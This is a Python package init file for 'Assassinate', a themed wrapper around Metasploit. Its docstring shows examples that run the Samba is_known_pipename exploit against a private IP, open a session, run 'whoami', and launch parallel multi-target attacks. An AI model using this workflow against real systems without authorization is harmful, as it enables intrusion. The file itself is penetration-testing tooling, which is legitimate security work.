"""Assassinate - A high-level Python framework for precision exploitation.

     █████╗ ███████╗███████╗ █████╗ ███████╗███████╗██╗███╗   ██╗ █████╗ ████████╗███████╗
    ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██║████╗  ██║██╔══██╗╚══██╔══╝██╔════╝
    ███████║███████╗███████╗███████║███████╗███████╗██║██╔██╗ ██║███████║   ██║   █████╗
    ██╔══██║╚════██║╚════██║██╔══██║╚════██║╚════██║██║██║╚██╗██║██╔══██║   ██║   ██╔══╝
    ██║  ██║███████║███████║██║  ██║███████║███████║██║██║ ╚████║██║  ██║   ██║   ███████╗
    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚══════╝

Assassinate provides a themed, high-level interface for Metasploit Framework
operations. It wraps the low-level `msf` Pyo3 bridge with an intuitive API
designed for streamlined exploitation workflows.

Architecture:
    Assassinate (High-Level API)
        ↓
    msf (Low-Level Pyo3 Bridge)
        ↓
    Rust/Magnus FFI
        ↓
    Embedded Ruby VM + Metasploit Framework

Quick Start - New API (Recommended):
    >>> from assassinate import Hideout, Target
    >>>
    >>> with Hideout() as hideout:
    ...     # Search for weapons
    ...     weapons = hideout.arsenal.find("samba", type="exploit")
    ...     weapon = weapons[0]
    ...
    ...     # Create contract for target
    ...     target = Target("192.168.1.100")
    ...     contract = hideout.contract(target, weapon)
    ...     contract.configure(SMB_SHARE_NAME="myshare")
    ...
    ...     # Profile and execute
    ...     if contract.profile():
    ...         kill = contract.execute()
    ...         if kill:
    ...             print(kill.interrogate("whoami"))

Quick Start - One-liner:
    >>> with Hideout() as hideout:
    ...     kill = hideout.quick_hit(
    ...         target="192.168.1.100",
    ...         weapon="exploit/linux/samba/is_known_pipename",
    ...         SMB_SHARE_NAME="myshare"
    ...     )
    ...     if kill:
    ...         print(kill.interrogate("id"))

Terminology:
    - Hideout: Your operational headquarters (framework manager)
    - Arsenal: Weapon search and discovery
    - Target: A host to be compromised
    - Weapon: An MSF module wrapped with user-friendly interface
    - Bullet: Shellcode/stager ammunition for a weapon
    - Contract: Target + Weapon + Bullet orchestration
    - Kill: Confirmed hit (active session on compromised target)
    - MassContract: Parallel multi-target attacks

Legacy API (still supported):
    >>> with Hideout() as hideout:
    ...     weapon = hideout.arm("exploit/linux/samba/is_known_pipename")
    ...     weapon.options.RHOSTS = "192.168.1.100"
    ...     asset = weapon.exploit("cmd/unix/interact")
    ...     if asset:
    ...         print(asset.run_cmd("whoami"))

For low-level access, use the `msf` module directly:
    >>> import msf
    >>> msf.init_msf("/path/to/metasploit-framework")
    >>> exploit = msf.create_module("exploit/linux/samba/is_known_pipename")

Attributes:
    __version__: Package version string.
"""

from __future__ import annotations

import os

__version__ = "0.4.0"

# Core high-level interface
from assassinate.hideout import Hideout

# New abstraction layer classes
from assassinate.target import Target
from assassinate.weapon import Weapon, Bullet
from assassinate.arsenal import Arsenal
from assassinate.contract import Contract, MassContract
from assassinate.kill import Kill
from assassinate.catalog import WeaponCatalog, BulletCatalog, WeaponInfo, BulletInfo

# Logging configuration
from assassinate.log_config import setup_logging, get_logger

# Re-export key types from msf for convenience
import msf
from msf import (
    # Module classes (for type hints and isinstance checks)
    ExploitModule,
    AuxiliaryModule,
    PostModule,
    PayloadModule,
    EncoderModule,
    EvasionModule,
    NopModule,
    BaseModule,
    # Session class
    Session,
    # Options
    ModuleOptions,
    # Exception
    AssassinateError,
    # Type alias
    AnyModule,
)

__all__ = [
    # Core
    "Hideout",
    "__version__",
    # New High-Level Abstraction
    "Target",
    "Weapon",
    "Bullet",
    "Arsenal",
    "Contract",
    "MassContract",
    "Kill",
    # Catalogs
    "WeaponCatalog",
    "BulletCatalog",
    "WeaponInfo",
    "BulletInfo",
    # Logging
    "setup_logging",
    "get_logger",
    # Module classes (re-exported from msf)
    "ExploitModule",
    "AuxiliaryModule",
    "PostModule",
    "PayloadModule",
    "EncoderModule",
    "EvasionModule",
    "NopModule",
    "BaseModule",
    # Session
    "Session",
    # Options
    "ModuleOptions",
    # Exception
    "AssassinateError",
    # Types
    "AnyModule",
    # Low-level module access
    "msf",
]

# Setup default logging based on environment variables
log_level = os.getenv("ASSASSINATE_LOG_LEVEL", "WARNING")
log_file = os.getenv("ASSASSINATE_LOG_FILE", None)
setup_logging(level=log_level, log_file=log_file, structured=True)
